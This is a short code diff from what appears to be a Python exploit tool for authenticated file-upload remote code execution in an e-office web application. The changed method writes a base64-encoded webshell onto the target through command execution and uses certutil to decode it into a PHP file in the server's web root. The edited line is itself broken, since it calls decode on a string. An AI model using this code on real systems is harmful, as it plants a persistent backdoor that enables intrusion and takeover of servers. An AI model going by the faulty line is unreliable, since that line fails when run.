@@ -133,7 +133,7 @@ class eoffice_auth_file_rce:
     def upload_webshell(self, localshell):
         try:
             with open(localshell, 'rb') as f:
-                b64_encoded = str((base64.b64encode(f.read())))[2:-1]
+                b64_encoded = str(base64.b64encode(f.read())).decode()
             self.execute_command(f"echo {b64_encoded} > iamwho.txt")
             sleep(5)
             self.execute_command("certutil -decode iamwho.txt ../www/eoffice10/server/public/iamwho.php")
